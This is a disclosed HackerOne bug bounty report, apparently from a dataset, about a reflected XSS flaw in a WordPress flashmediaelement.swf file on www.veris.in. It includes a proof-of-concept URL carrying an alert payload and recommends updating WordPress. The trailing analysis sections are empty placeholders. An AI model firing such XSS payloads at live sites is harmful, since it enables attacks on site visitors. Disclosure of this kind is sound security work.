---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '137938'
original_report_id: '137938'
title: Reflected XSS in domain www.veris.in
weakness: Cross-site Scripting (XSS) - Generic
team_handle: veris
created_at: '2016-05-11T16:31:12.599Z'
disclosed_at: '2016-06-16T17:53:02.058Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS in domain www.veris.in

## Metadata

- HackerOne Report ID: 137938
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: veris
- Disclosed At: 2016-06-16T17:53:02.058Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi tream,

veris.in is vulnerable  reflected XSS that stems from an insecure URL sanitization process performed in the file flashmediaelement.swf

PoC:
===
https://www.veris.in/wp-includes/js/mediaelement/flashmediaelement.swf?jsinitfunctio%gn=alert`1`

Fix:
===
Update to WordPress 4.5.2

regards,
aziose

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
